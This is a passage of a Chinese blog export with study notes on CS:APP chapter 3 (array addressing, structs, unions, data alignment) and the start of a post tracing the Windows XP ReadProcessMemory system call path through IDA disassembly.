<li>其次，它引入了标识符<code>A</code>，可以用<code>A</code>来作为指向数组开头的<mark class="label warning">指针</mark>，这个指针的值就是  $x_a$ 。可以用<code>0～N-1</code>的整数索引来访问该数组元素。</li>
<li>数组元素<code>i</code>会被存放在地址为<mark class="label success"> $x_a+L·i$</mark>的地方，同时<code>A[i]</code>的值存放在 <mark class="label success">$M[x_a+L·i]$</mark>的内存中。</li>
</ul>
</li>
</ol>
<p>对于数组的计算中，常用的两个指令是<code>mov</code>和<code>leaq</code>：</p>
<ul>
<li>x84-64中任何指针指向的一个地址都是 8 个字节，如<code>char*</code>、<code>short*</code>、<code>int*</code>、<code>double*</code></li>
<li><code>mov</code>类指令用来将一个数值复制到目的寄存器或内存中，对于指针指向的地址则必须使用<code>leaq</code>来进行地址操作</li>
</ul>
<p>x86-64的内存引用指令用来简化数组引用，例如，假设<code>E</code>是一个<code>int</code>型的数组， 而我们想计算 $E[i]$ 和 $\&amp;E[i]$，在此，$E$ 的地址存放在寄存器<code>%rdx</code>中，而<code>i</code>存放在寄存器<code>%rcx</code>中。</p>
<ul>
<li><p>计算 $x_E十4i$ ：<code>leaq (%rdx,%rcx,4) %rax</code>来获取地址，然后将地址存放在寄存器<code>%rax</code>中。</p>
</li>
<li><p>计算$M[x_E+4·i]$ ：指令 <code>movl (%rdx,%rcx,4), %eax</code> 会执行地址计算 $x_E十4i$ ，读这个内存位置的值，并将结果存放到寄存器<code>%eax</code>中。</p>
</li>
</ul>
<p><strong>指针运算</strong></p>
<p>单操作数操作符<code>&amp;</code>和<code>*</code>可以产生指针和间接引用指针，如<code>&amp;Expr</code>是给出该对象地址的一个指针，<code>*Expr</code>是给出该地址处的值。</p>
<p>举个例子，假设整型数组<code>E</code>的起始地址和整数索引<code>i</code>分别存放在寄存器<code>%rdx</code>和<code>%rcx</code>中。下面给出了每个表达式的汇编代码实现，结果存放在寄存器<code>%eax</code>（如果是数据）或寄存器<code>%rax</code>（如果是指针）中。</p>
<p><img data-src="https://i.loli.net/2020/10/21/efwEb4lurkiBohD.png" alt="27数组计算.png"></p>
<p><img data-src="https://i.loli.net/2020/10/21/mlrDwvTN6zxu2bj.png" alt="3A数组计算.png"></p>
<h4 id="3-8-2-二维数组"><a href="#3-8-2-二维数组" class="headerlink" title="3.8.2 二维数组"></a>3.8.2 二维数组</h4><p>要访问多维数组的元素，编译器会以数组起始为基地址，（可能需要经过伸缩的）偏移量为索引，产生计算期望的元素的偏移量，然后使用某种<code>MOV</code>指令。通常来说，对于一个声明如下的数组:</p>
<p>$T \ \ D[R][C]$</p>
<ul>
<li>第<code>i</code>行的起始地址 $D[i]$：$D[i] &#x3D; x_D+L*(C*i)$，$x_D$ 是 $D[0]$ 的地址，$C*L$ 是一行的地址长度（不包含数据类型时）</li>
<li>第<code>n</code>行中的第<code>j</code>个数组元素地址：$\&amp;D[n][j] &#x3D; D[n]+j*L$，其中 $D[n] &#x3D; x_D+n*(L*C)$</li>
<li>它的数组元素 $D[i][j]$ 的地址为： $\&amp;D[i][j] &#x3D; x_D+L(C*i+j)$</li>
</ul>
<h4 id="3-8-3-定长数组和变长数组"><a href="#3-8-3-定长数组和变长数组" class="headerlink" title="3.8.3 定长数组和变长数组"></a>3.8.3 定长数组和变长数组</h4><p>关于定长数组和变长数组，是针对编译器来说的，也就是说，如果在编译时数组的长度确定，我们就称为定长数组，反之则称为变长数组。如：</p>
<ul>
<li>定长：函数在使用数组<code>a[5][6]</code>时就是定长数组，因为数组长度已经在编译前确定，<mark class="label primary">是静态的</mark></li>
<li>变长：在使用数组<code>a[m][n]</code>时，<code>m</code>和<code>n</code>预先已经赋值正整数，但是计算机在编译前并不知道<code>m</code>和<code>n</code>的值，而是在编译的时候才知道，<mark class="label warning">是动态的</mark></li>
</ul>
<p>还有一个区别：</p>
<ol>
<li>由于变长是动态的编译，函数在编译后相对于定长的寄存器的使用变化了。</li>
<li>动态的版本<mark class="label danger">必须用乘法指令</mark>对<code>i</code>伸缩<code>n</code>倍，而不能用一系列的移位和加法。在一些处理器中，乘法会招致严重的性能处罚，但是在这种情况中无可避免。</li>
</ol>
<p>如下两张图片，上图是静态编译（定长）的，下图是动态编译（变长）的：</p>
<p><img data-src="https://i.loli.net/2020/10/21/pjwqo13uW6VS7ZF.png" alt="3B静态编译.png"><img data-src="https://i.loli.net/2020/10/21/NltT6gHExjVRdC4.png" alt="3C动态编译.png"></p>
<h3 id="3-9-结构体联合体数据对齐"><a href="#3-9-结构体联合体数据对齐" class="headerlink" title="3.9 结构体联合体数据对齐"></a>3.9 结构体联合体数据对齐</h3><p>结构（struct）和联合（union）可以将多个对象集合到一个单位中，且这个数据结构中的多个对象都存放在内存的<strong>连续区域</strong>。</p>
<h4 id="3-9-1-结构"><a href="#3-9-1-结构" class="headerlink" title="3.9.1 结构"></a>3.9.1 结构</h4><p>C语言的 <code>struct</code> 创建一种数据类型（称为结构体），将可能不同的数据类型的对象聚合到一个对象中。结构体中各个组成部分由名字来引用。类似于数组的实现，结构体的所有组成部分都存放在存储器中的一段<strong>连续的区域</strong>内，<strong>指向结构体的指针就是结构体第一个字节的地址</strong>。编译器维护每个结构类型的信息，指示每个字段（field）的字节偏移。以这些偏移作为存储器引用中指令的位移，从而产生对结构体元素的引用。</p>
<div class="note info"><p>假设有个对象<code>Pm</code>，它有个成员对象为<code>hight</code>，则<code>Pm-&gt;hight</code>等价于表达式<code>*(Pm).hight</code>，且非法的写法为<code>*Pm.hight</code>，它会被解释为<code>*(Pm.hight)</code>。</p>
</div>

<p>假设有下面的结构体声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rec</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2020/10/22/XmovMiT7ILBkwHW.png" alt="3D结构字节长度.png"></p>
<div class="note success"><p>要产生一个指向结构内部对象的指针，只需要将结构的起始地址加上该字段的偏移量。</p>
</div>



<p>下面的代码给出了类型 ELE 的结构声明以及函数 fun 的原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">p</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当编译 fun 的代码时，GCC 会产生如下汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># long fun(struct ELE *ptr)</span></span><br><span class="line"><span class="meta"># ptr in %rdi</span></span><br><span class="line"></span><br><span class="line">fun:</span><br><span class="line">    movl   $<span class="number">0</span>, %eax          <span class="meta"># result = 0</span></span><br><span class="line">    jmp    .L2               # Goto middle</span><br><span class="line">  .L3:                       <span class="meta"># loop:</span></span><br><span class="line">    addq   (%rdi), %rax      <span class="meta"># result += ptr-&gt;v</span></span><br><span class="line">    movq   <span class="number">8</span>(%rdi), %rdi     <span class="meta"># ptr = ptr-&gt;p</span></span><br><span class="line">  .L2:                       <span class="meta"># middle:</span></span><br><span class="line">    testq  %rdi, %rdi        # Test ptr</span><br><span class="line">    jne    .L3               # If != <span class="literal">NULL</span>, <span class="keyword">goto</span> loop</span><br><span class="line">    rep; ret                </span><br></pre></td></tr></table></figure>

<p>A. 利用逆向工程技巧写出 fun 的 C 代码。</p>
<p>B. 描述这个结构实现的数据结构以及 fun 执行的操作。</p>
<p>A. fun 的 C 代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fun</span><span class="params">(struct ELE *ptr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ptr) &#123;</span><br><span class="line">        val += ptr-&gt;v;</span><br><span class="line">        ptr = ptr-&gt;p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>B. 每个结构都是一个单链表中的元素，字段 v 是元素的值，字段 p 是指向下一个元素的指针。函数 fun 计算列表中元素值的和。</p>
<h4 id="3-9-2-联合体"><a href="#3-9-2-联合体" class="headerlink" title="3.9.2 联合体"></a>3.9.2 联合体</h4><p>联合体允许以多种类型来引用同一个对象，<strong>用不同的字段来引用相同的内存</strong>。</p>
<p>考虑下面的声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S3</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">double</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">U3</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">double</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在一台 IA64(x86-64) Linux 机器上编译时，字段的偏移量、数据类型S3和U3的完整大小如下：</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">偏移量：c</th>
<th align="center">偏移量：i</th>
<th align="center">偏移量：v</th>
<th align="center">大小</th>
</tr>
</thead>
<tbody><tr>
<td align="center">S3</td>
<td align="center">0</td>
<td align="center">4</td>
<td align="center">12</td>
<td align="center">20</td>
</tr>
<tr>
<td align="center">U3</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">8</td>
</tr>
</tbody></table>
<p><strong>一个联合体的总的大小总是等于它的</strong><mark class="label success">最大字段</mark><strong>的大小</strong>。对于类型结构体 U 的指针 <code>p</code>，<code>p-&gt;c</code>、<code>p-&gt;i[0]</code>、<code>p-&gt;v</code> 都是引用数据结构的<strong>起始位置</strong>。这里S3的<code>i</code>的偏移量是4不是1以及<code>v</code>的偏移量是12不是9主要是因为数据对齐（在下一节中讲解）。</p>
<p>关于课本的举例可参考<a href="https://www.cnblogs.com/ZCplayground/p/7437574.html">【CSAPP笔记】8. 汇编语言——数据存储</a>的联合体部分。</p>
<div class="note default"><p>当用联合来将各种大小不同的数据类型结合到一起时，字节顺序的问题就变得很重要。</p>
</div>



<div class="note info"><p><strong><code>struct</code>和<code>union</code>的区别：</strong><code>struct</code>为每个对象分配了单独的内存空间，而<code>union</code>分配了共用的内存空间。</p>
<p><strong>什么时候用<code>union</code>什么时候用<code>struct</code>：</strong>当你要信息同时存在时，就需要分配到不同的内存中，就要用<code>struct</code>，否则用<code>union</code>。</p>
<p><strong>计算struct和union嵌套的数据类型的内存分布：</strong></p>
<ul>
<li>如果是包裹在struct内的，就按顺序按照对象大小依次排列下来</li>
<li>如果是包裹在union内的，就看最大的对象大小，直接分配一块内存就行</li>
</ul>
</div>



<h4 id="3-9-3-数据对齐（字节对齐）"><a href="#3-9-3-数据对齐（字节对齐）" class="headerlink" title="3.9.3 数据对齐（字节对齐）"></a>3.9.3 数据对齐（字节对齐）</h4><p>x86-64虽然不需要对齐也能正常工作，但为了<strong>提高效率</strong>， Intel建议要对齐， 原则是K字节的基本对象的地址必须是K的倍数。</p>
<p>数据对齐为什们能提高效率，解释如下：</p>
<p>假如一次取4个字节，若有个<code>int</code>存在<code>0x01-0x04</code>，则一次就能取出，若存在<code>0x03-0x06</code>，则需要分两次才能取到(第一次<code>0x01-0x04</code>，第二次<code>0x05-0x08</code>)，这样会降低CPU效率，更何况还有像<code>short</code>，<code>char</code>之类的不是4个字节的数据。因此，编译器会对数据进行强制对齐。</p>
<p>对于<strong>包含结构</strong>的代码，编译器可能需要在字段的分配中<strong>插入间隙</strong>，以保证每个结构元素都满足它的对齐要求。而结构本身对它的起始地址也有一些对齐要求。</p>
<p>编译器在汇编代码中放入命令，指明全局数据所需的对齐。例如<code>.align 8</code>，表示其后分配地址的时候都以8位倍数分配。因为每个表项长8个字节，后面的元素都会遵守<strong>8字节对齐</strong>的限制。而且引用这些对象的指针，也必须以同样的倍数对齐。</p>
<div class="note primary"><p>数据对齐规则：</p>
<ol>
<li><p>任何<mark class="label primary">K字节</mark>的基本数据对象的<mark class="label warning">偏移量</mark>必须是<mark class="label success">K的倍数</mark>，若不是，则对<mark class="label info">前一个数据对象</mark>进行数据填充。</p>
</li>
<li><p>在结构末尾根据需要会做一些填充，使其一旦被拓展为数组时可以满足条件1，而且拓展时是以<mark class="label success">数组中下一个结构体元素中</mark><mark class="label danger">数据大小最大</mark>那个元素为标准来对齐的。</p>
</li>
</ol>
</div>

<p>我们可以画图把一个个对象依次填充进去，并且要求它的偏移量是满足K的倍数。然后考虑要在末尾填充多少字节能够使得总共大小是最大对象大小的倍数。最终最大对象的大小就是对初始地址的对齐要求。</p>
<p>举例说明偏移量和字节填充是如何进行数据对齐的：</p>
<ol>
<li><p><code>struct P1&#123;int i; char c; int j; char d; &#125;;</code></p>
<ul>
<li><code>i</code>偏移量为0，是4的倍数，满足；</li>
<li><code>c</code>偏移量为4，是1的倍数，满足；</li>
<li><code>j</code>偏移量为5，不是4的倍数，需要填充3个字节，使得偏移量为8，才是4的倍数；</li>
<li><code>d</code>偏移量为12，是1的倍数，满足；</li>
<li>总共大小为13字节，而最大对象是<code>int</code>4字节，所以需要填充3字节，使其为4的倍数，所以该结构体为16字节。</li>
</ul>
</li>
<li><p><code>struct P2&#123;int i; char c; char d; long j; &#125;;</code></p>
<ul>
<li><code>i</code>的偏移量为0，是4的倍数，满足；</li>
<li><code>c</code>的偏移量为4，是1的倍数，满足；</li>
<li><code>d</code>的偏移量为5，是1的倍数，满足；</li>
<li><code>j</code>的偏移量为6，不是8的倍数，需要补充2个字节，使其偏移量为8；</li>
<li>总共大小为16字节，是最大对象<code>long</code>的倍数，所以不用填充。</li>
</ul>
</li>
<li><p><code>struct P3&#123;short w[3]; char c[3]; &#125;;</code></p>
<ul>
<li>数组<code>w</code>的偏移量为0，然后依次排列3个大小为2字节的数据，能够保证每个偏移量都是2的倍数，满足；</li>
<li>数组<code>c</code>的第一个元素的偏移量为6，是1的倍数，而后依次排列3个大小为1字节的数据；</li>
<li>总共大小为9字节，不是结构中最大对象<code>short</code>的倍数，所以还要填充1个字节，所以该结构大小为10字节。</li>
</ul>
</li>
<li><p><code>struct P4&#123;short w[5]; char *c[3]; &#125;;</code></p>
<ul>
<li>数组<code>w</code>的偏移量为0，然后依次排列5个大小为2字节的数据，能够保证每个偏移量都是2的倍数，满足；</li>
<li>数组<code>c</code>的第一个元素偏移量为10，不是8的倍数，所以要填充6个字节，使其偏移量为16，是8的倍数，然后就能依次排列3个大小为8字节的数据了；</li>
<li>总共大小为40字节，是2的倍数，所以对齐了。</li>
</ul>
</li>
<li><p><code>struct P5&#123;struct P3 a[2]; struct P2 t; &#125;;</code></p>
<ul>
<li>保存两个<code>struct P3</code>，一共需要20个字节，并且保证初始地址是2的倍数；</li>
<li><code>struct P2</code>要求初始地址是8的倍数，但是第一个对象<code>i</code>的偏移量是20，不是8的倍数，所以要填充4个字节，使得<code>i</code>的偏移量为24，是4的倍数，然后直接把<code>struct P2</code>的所有对象按上面的方式填充进去；</li>
<li>总共大小是40字节（24+16&#x3D;40），是8的倍数，所以对齐了。</li>
</ul>
</li>
<li><p>优化存储：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *a;</span><br><span class="line">  <span class="keyword">short</span> b;</span><br><span class="line">  <span class="keyword">double</span> c;</span><br><span class="line">  <span class="keyword">char</span> d;</span><br><span class="line">  <span class="keyword">float</span> e;</span><br><span class="line">  <span class="keyword">char</span> f;</span><br><span class="line">  <span class="keyword">long</span> g;</span><br><span class="line">  <span class="keyword">int</span> h;</span><br><span class="line">&#125; rec;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>a</code>偏移量为0；</li>
<li><code>b</code>偏移量为8；</li>
<li><code>c</code>偏移量为10，不是8的倍数，填充6的字节，使得偏移量为16；</li>
<li><code>d</code>偏移量为24；</li>
<li><code>e</code>偏移量为25，不是4的倍数，填充3个字节，使得偏移量为28；</li>
<li><code>f</code>的偏移量为32；</li>
<li><code>g</code>的偏移量为33，不是8的倍数，填充7个字节，使得偏移量为40；</li>
<li><code>h</code>的偏移量为48;</li>
<li>最后的地址为52，不是第一个元素<code>a</code>要求的8的倍数，所以还要在末尾填充4个字节， 所以最终大小为56个字节。</li>
</ul>
<p>我们可以改变声明的顺序，按照从大到小的形式进行声明，可以减少填充的字节数目，节省该结构的空间大小：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *a;</span><br><span class="line">  <span class="keyword">double</span> c;</span><br><span class="line">  <span class="keyword">long</span> g;</span><br><span class="line">  <span class="keyword">float</span> e;</span><br><span class="line">  <span class="keyword">int</span> h;</span><br><span class="line">  <span class="keyword">short</span> b;</span><br><span class="line">  <span class="keyword">char</span> d;</span><br><span class="line">  <span class="keyword">char</span> f;</span><br><span class="line">&#125; rec;</span><br></pre></td></tr></table></figure>

<ul>
<li>这样依次排列下来，只要40个字节，节省了28.5%的存储空间。</li>
</ul>
</li>
</ol>
<p>参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/105072458">[读书笔记]CSAPP：8[VB]机器级表示：数据</a></li>
<li><a href="https://www.cnblogs.com/ZCplayground/p/7437574.html">【CSAPP笔记】8. 汇编语言——数据存储</a></li>
<li><a href="https://www.cnblogs.com/czw52460183/p/10364721.html">CSAPP阅读笔记-struct, union, 数据对齐-来自第三章3.9的笔记-P183-P191</a></li>
</ul>
<h3 id="3-10-指针操作与缓冲区溢出"><a href="#3-10-指针操作与缓冲区溢出" class="headerlink" title="3.10 指针操作与缓冲区溢出"></a>3.10 指针操作与缓冲区溢出</h3>]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>CS:APP</tag>
        <tag>逆向</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 系统调用（一）</title>
    <url>/post/WinXP-SystemCall/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-Windows-API"><a href="#1-Windows-API" class="headerlink" title="1 Windows API"></a>1 Windows API</h2><ol>
<li><code>Application Programming Interface</code>，简称 API 函数。</li>
<li>主要是存放在 <code>C:\WINDOWS\system32</code>下面所有的dll导出的函数。</li>
<li>几个重要的DLL</li>
</ol>
<ul>
<li>Kernel32.dll：最核心的功能模块，比如管理内存、进程和线程相关的函数等。</li>
<li>User32.dll：是Windows用户界面相关应用程序接口，如创建窗口和发送消息等。</li>
<li>GDI32.dll：全称是Graphical Device Interface(图形设备接口)，包含用于画图和显示文本的函数。比如要显示一个程序窗口，就调用了其中的函数来画这个窗口。</li>
<li>Ntdll.dll：<mark class="label default">大多数API都会通过这个DLL进入内核(0环)</mark>。</li>
</ul>
<p>R3下无论如何调用，均无法绕过SSDT HOOK，R0下调用Nt*可以绕过SSDT HOOK。Rtl* 函数是windows ddk提供的编写驱动的函数。</p>
<p><a href="https://blog.csdn.net/qq1841370452/article/details/54393834">内核驱动全部集合</a>。</p>
<h2 id="2-3环进0环"><a href="#2-3环进0环" class="headerlink" title="2 3环进0环"></a>2 3环进0环</h2><h3 id="2-1-分析ReadProcessMemory3环调用过程"><a href="#2-1-分析ReadProcessMemory3环调用过程" class="headerlink" title="2.1 分析ReadProcessMemory3环调用过程"></a>2.1 分析ReadProcessMemory3环调用过程</h3><p>分析kernel32.dll导出函数<code>ReadProcessMemory(x,x,x,x)</code>调用流程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C8021C6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">7</span>C8021CB                 align <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; Exported entry <span class="number">682.</span> ReadProcessMemory</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; <span class="function">BOOL __stdcall <span class="title">ReadProcessMemory</span><span class="params">(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead)</span></span></span><br><span class="line">.text:7C8021D0                 public _ReadProcessMemory@20</span><br><span class="line">.text:<span class="number">7</span>C8021D0 _ReadProcessMemory@<span class="number">20</span> proc near         ; CODE XREF: GetProcessVersion(x)+<span class="number">2F</span>12F↓p</span><br><span class="line">.text:<span class="number">7</span>C8021D0                                         ; GetProcessVersion(x)+<span class="number">2F</span>14E↓p ...</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 hProcess        = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">7</span>C8021D0 lpBaseAddress   = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">7</span>C8021D0 lpBuffer        = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0 nSize           = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0 lpNumberOfBytesRead= dword ptr  <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0                 mov     edi, edi</span><br><span class="line">.text:<span class="number">7</span>C8021D2                 push    ebp</span><br><span class="line">.text:<span class="number">7</span>C8021D3                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">7</span>C8021D5                 lea     eax, [ebp+nSize]</span><br><span class="line">.text:<span class="number">7</span>C8021D8                 push    eax             ; NumberOfBytesRead</span><br><span class="line">.text:<span class="number">7</span>C8021D9                 push    [ebp+nSize]     ; NumberOfBytesToRead</span><br><span class="line">.text:<span class="number">7</span>C8021DC                 push    [ebp+lpBuffer]  ; Buffer</span><br><span class="line">.text:<span class="number">7</span>C8021DF                 push    [ebp+lpBaseAddress] ; BaseAddress</span><br><span class="line">.text:<span class="number">7</span>C8021E2                 push    [ebp+hProcess]  ; ProcessHandle</span><br><span class="line">.text:<span class="number">7</span>C8021E5                 call    ds:__imp__NtReadVirtualMemory@<span class="number">20</span> ; NtReadVirtualMemory(x,x,x,x,x)</span><br><span class="line">.text:<span class="number">7</span>C8021EB                 mov     ecx, [ebp+lpNumberOfBytesRead]</span><br><span class="line">.text:<span class="number">7</span>C8021EE                 test    ecx, ecx</span><br><span class="line">.text:<span class="number">7</span>C8021F0                 jnz     <span class="keyword">short</span> loc_7C8021FD</span><br><span class="line">.text:<span class="number">7</span>C8021F2</span><br><span class="line">.text:<span class="number">7</span>C8021F2 loc_7C8021F2:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">32</span>↓j</span><br><span class="line">.text:<span class="number">7</span>C8021F2                 test    eax, eax</span><br><span class="line">.text:<span class="number">7</span>C8021F4                 jl      <span class="keyword">short</span> loc_7C802204</span><br><span class="line">.text:<span class="number">7</span>C8021F6                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">7</span>C8021F8                 inc     eax</span><br><span class="line">.text:<span class="number">7</span>C8021F9</span><br><span class="line">.text:<span class="number">7</span>C8021F9 loc_7C8021F9:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">3</span>C↓j</span><br><span class="line">.text:<span class="number">7</span>C8021F9                 pop     ebp</span><br><span class="line">.text:<span class="number">7</span>C8021FA                 retn    <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021FD ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">7</span>C8021FD</span><br><span class="line">.text:<span class="number">7</span>C8021FD loc_7C8021FD:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">20</span>↑j</span><br><span class="line">.text:<span class="number">7</span>C8021FD                 mov     edx, [ebp+nSize]</span><br><span class="line">.text:<span class="number">7</span>C802200                 mov     [ecx], edx</span><br><span class="line">.text:<span class="number">7</span>C802202                 jmp     <span class="keyword">short</span> loc_7C8021F2</span><br><span class="line">.text:<span class="number">7</span>C802204 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">7</span>C802204</span><br><span class="line">.text:<span class="number">7</span>C802204 loc_7C802204:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">24</span>↑j</span><br><span class="line">.text:<span class="number">7</span>C802204                 push    eax             ; Status</span><br><span class="line">.text:<span class="number">7</span>C802205                 call    _BaseSetLastNTError@<span class="number">4</span> ; BaseSetLastNTError(x)</span><br><span class="line">.text:<span class="number">7</span>C80220A                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">7</span>C80220C                 jmp     <span class="keyword">short</span> loc_7C8021F9</span><br><span class="line">.text:<span class="number">7</span>C80220C _ReadProcessMemory@<span class="number">20</span> endp</span><br><span class="line">.text:<span class="number">7</span>C80220C</span><br><span class="line">.text:<span class="number">7</span>C80220C ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>双击查看<code>.text:7C8021E5  call  ds:__imp__NtReadVirtualMemory@20 ; NtReadVirtualMemory(x,x,x,x,x)</code>，结果如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">.idata:<span class="number">7</span>C801418 ; <span class="function">NTSTATUS __stdcall <span class="title">NtReadVirtualMemory</span><span class="params">(HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         PVOID BaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         PVOID Buffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         SIZE_T NumberOfBytesToRead, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         PSIZE_T NumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        )</span></span></span><br><span class="line">.idata:7C801418   extrn __imp__NtReadVirtualMemory@20:dword</span><br></pre></td></tr></table></figure>

<p><code>__imp__</code>表示这里的<code>NtReadVirtualMemory</code>函数是从导入表导入的，在IDA导入表中查看可得<code>NtReadVirtualMemory</code>：位于ntdll.dll。</p>
<p><img data-src="https://s2.loli.net/2022/01/26/Cu9FTQ8IcReJiWE.png" alt="1.png"></p>
<p>分析得如下结论：</p>
<ul>
<li><code>ReadProcessMemory</code>：位于kernel32.dll</li>
<li><code>NtReadVirtualMemory</code>：位于ntdll.dll</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">ReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"> [IN]	HANDLE hProcess,	<span class="comment">//目标进程的句柄，该句柄必须对目标进程具有PROCESS_VM_READ的访问权限。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [IN]	LPCVOID lpBaseAddress,	<span class="comment">//从目标进程中读取数据的起始地址。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [OUT]	LPVOID lpBuffer,	<span class="comment">//用来接收数据的缓存区地址。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [IN]	SIZE_T nSize,		<span class="comment">// 从目标进程读取数据的字节数。如果被指定为NULL,那么将忽略此参数。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [OUT]	SIZE_T *lpNumberOfBytesRead)</span><span class="comment">//实际被读取数据大小的存放地址。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  NtReadVirtualMemory(hProcess,lpBaseAddress,Buffer,nSize,&amp;nSize);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>ntdll.dll</code>的导出表查看<code>NtReadVirtualMemory</code>函数，发现其调用了<code>0x7FFE0300</code>处的函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C92D9E0 ; <span class="function">__stdcall <span class="title">NtReadVirtualMemory</span><span class="params">(x, x, x, x, x)</span></span></span><br><span class="line">.text:7C92D9E0                 public _NtReadVirtualMemory@20</span><br><span class="line">.text:<span class="number">7</span>C92D9E0 _NtReadVirtualMemory@<span class="number">20</span> proc near       ; CODE XREF: LdrFindCreateProcessManifest(x,x,x,x,x)+<span class="number">1</span>CC↓p</span><br><span class="line">.text:<span class="number">7</span>C92D9E0                                         ; LdrCreateOutOfProcessImage(x,x,x,x)+<span class="number">7</span>C↓p ...</span><br><span class="line">.text:<span class="number">7</span>C92D9E0                 mov     eax, <span class="number">0B</span>Ah       ; NtReadVirtualMemory</span><br><span class="line">.text:<span class="number">7</span>C92D9E5                 mov     edx, <span class="number">7F</span>FE0300h</span><br><span class="line">.text:<span class="number">7</span>C92D9EA                 call    dword ptr [edx]</span><br><span class="line">.text:<span class="number">7</span>C92D9EC                 retn    <span class="number">14</span>h</span><br><span 